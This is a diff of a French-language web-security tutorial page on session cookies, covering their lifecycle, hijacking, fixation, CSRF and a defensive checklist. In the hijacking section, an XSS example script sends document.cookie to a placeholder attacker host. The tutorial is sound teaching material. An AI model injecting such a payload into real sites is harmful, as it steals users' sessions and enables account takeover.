@@ -1,5 +1,5 @@
 <section class="content-block">
-    <h2><i class="fas fa-info-circle" aria-hidden="true"></i>Fondamentaux des Cookies</h2>
+    <h2><i class="fas fa-info-circle" aria-hidden="true"></i> Fondamentaux des Cookies</h2>
     <p>
         Le protocole HTTP est dit "sans état" (stateless). Cela signifie que chaque requête envoyée par un client à un serveur est un événement indépendant. Le serveur ne conserve nativement aucune information sur les requêtes précédentes. Sans un mécanisme additionnel, il est impossible de maintenir une session utilisateur cohérente (garder un utilisateur connecté, son panier, etc.).
     </p>
@@ -7,7 +7,7 @@
         <strong>Une analogie simple :</strong> Imaginez un vendeur qui a une mémoire de poisson rouge. Chaque fois que vous lui parlez, il ne se souvient pas de qui vous êtes. C'est le problème du HTTP "sans état".
     </p>
     <p>
-        La solution est le cookie : une petite information textuelle. Le serveur donne ce ticket au navigateur via l'en-tête de réponse <code>Set-Cookie</code>. Le navigateur le présente ensuite à chaque nouvelle requête via l'en-tête <code>Cookie</code>, permettant au serveur de se "souvenir" de vous.
+        La solution est le cookie : une petite information textuelle. Le serveur donne ce "ticket" au navigateur via l'en-tête de réponse <code>Set-Cookie</code>. Le navigateur le présente ensuite à chaque nouvelle requête via l'en-tête <code>Cookie</code>, permettant au serveur de se "souvenir" de vous.
     </p>
 <pre><code># 1. Première visite (sans cookie)
 CLIENT → SERVEUR: GET /page1
@@ -24,7 +24,7 @@ SERVEUR → CLIENT: Contenu de la page (le serveur sait que c'est le même visit
 </section>
 
 <section class="content-block">
-    <h2><i class="fas fa-sync-alt" aria-hidden="true"></i>Cycle de Vie et Anatomie d'un Cookie de Session</h2>
+    <h2><i class="fas fa-sync-alt" aria-hidden="true"></i> Cycle de Vie et Anatomie d'un Cookie de Session</h2>
     <p>
         Le cycle de vie d'un cookie de session commence typiquement lors de l'authentification.
     </p>
@@ -55,7 +55,7 @@ Cookie: sessionid=u7xGz...</code></pre>
 </section>
 
 <section class="content-block">
-    <h2><i class="fas fa-user-secret" aria-hidden="true"></i>Vecteurs d'Attaques et Exploitation</h2>
+    <h2><i class="fas fa-user-secret" aria-hidden="true"></i> Vecteurs d'Attaques et Exploitation</h2>
     <p>Une mauvaise gestion des cookies de session expose les utilisateurs à des risques critiques.</p>
 
     <h3>Détournement de Session (Session Hijacking)</h3>
@@ -72,6 +72,11 @@ Cookie: sessionid=u7xGz...</code></pre>
   // Ce script envoie le cookie de l'utilisateur vers un site contrôlé par l'attaquant
   fetch('https://attaquant.com/log?cookie=' + document.cookie);
 &lt;/script&gt;</code></pre>
+
+    <h3>Falsification de Requête Inter-Sites (CSRF)</h3>
+    <p>
+        Cette attaque force le navigateur d'un utilisateur déjà authentifié à exécuter une action non désirée sur un site web de confiance. L'attaquant crée une page ou un e-mail piégé (ex: une image cachée) qui, lorsqu'il est chargé par la victime, envoie une requête vers un autre site (ex: sa banque) en utilisant son cookie de session. L'attribut <code>SameSite</code> est la principale défense contre cette attaque.
+    </p>
 
     <h3>Fixation de Session</h3>
     <p>
@@ -91,14 +96,14 @@ Cookie: sessionid=u7xGz...</code></pre>
 </section>
 
 <section class="content-block">
-    <h2><i class="fas fa-shield-alt" aria-hidden="true"></i>Stratégies de Défense et Bonnes Pratiques</h2>
+    <h2><i class="fas fa-shield-alt" aria-hidden="true"></i> Stratégies de Défense et Bonnes Pratiques</h2>
     <p>
         La sécurisation des sessions repose sur une configuration stricte des cookies et une gestion rigoureuse de leur cycle de vie.
     </p>
     <h3>Check-list de Sécurisation Avancée</h3>
     <ul>
         <li><strong>Utiliser <code>HttpOnly</code> et <code>Secure</code> systématiquement :</strong> C'est la défense de base non négociable.</li>
-        <li><strong>Implémenter <code>SameSite=Lax</code> ou <code>Strict</code> :</strong> Une mesure efficace pour prévenir les attaques <code>CSRF</code>.</li>
+        <li><strong>Implémenter 'SameSite=Lax' ou 'Strict' :</strong> Une mesure efficace pour prévenir les attaques <code>CSRF</code>.</li>
         <li><strong>Régénérer l'ID de session à chaque changement de privilège :</strong> Il est impératif de générer un nouvel identifiant après une connexion réussie pour contrer la fixation de session.</li>
         <li><strong>Configurer un Timeout de session court :</strong> Définir une durée de vie courte pour les sessions inactives (ex: 15-30 minutes) afin de réduire la fenêtre d'opportunité pour un attaquant.</li>
         <li><strong>Utiliser des identifiants de session longs et aléatoires :</strong> Les ID doivent être générés par un générateur de nombres aléatoires cryptographiquement sûr (<code>CSPRNG</code>) pour être imprédictibles.</li>
@@ -107,7 +112,7 @@ Cookie: sessionid=u7xGz...</code></pre>
 </section>
 
 <section class="content-block">
-    <h2><i class="fas fa-flag-checkered" aria-hidden="true"></i>Conclusion</h2>
+    <h2><i class="fas fa-flag-checkered" aria-hidden="true"></i> Conclusion</h2>
     <p>
         La gestion des sessions via les cookies est un pilier de l'expérience web, mais elle constitue aussi une surface d'attaque majeure. Comprendre le cycle de vie d'un cookie, la signification de ses attributs de sécurité et les vecteurs d'attaque courants est une nécessité. Une configuration rigoureuse est essentielle pour protéger les comptes et les données des utilisateurs.
     </p>
